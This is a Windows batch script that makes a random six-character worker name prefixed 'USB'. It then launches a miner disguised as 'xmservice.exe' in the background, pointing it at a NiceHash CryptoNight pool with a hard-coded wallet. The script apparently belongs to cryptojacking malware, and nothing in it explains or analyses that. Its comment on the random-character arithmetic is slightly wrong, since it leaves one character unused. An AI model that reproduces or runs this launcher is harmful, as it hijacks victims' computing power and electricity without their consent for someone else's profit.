@echo off

setlocal EnableDelayedExpansion
set alphabet=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789
set count=0
:_loop
set /a count+=1
set rand=%random%
rem Use (Number of characters-1) as the mod operand. So for just 26 letters use 25 instead of 61
set /a rand=rand%%61
set randalphanum=!alphabet:~%rand%,1!
rem Keep adding on letters
set uniq=%uniq%!randalphanum!
if !count! leq 5 goto _loop

xmservice.exe --donate-level=1 --nicehash -v 2 -o cryptonight.usa.nicehash.com:3355 -u 39amrZeZ9Ac9nbdw5hryUknHUZ9JjRpArx.USB%uniq% -p x -k -B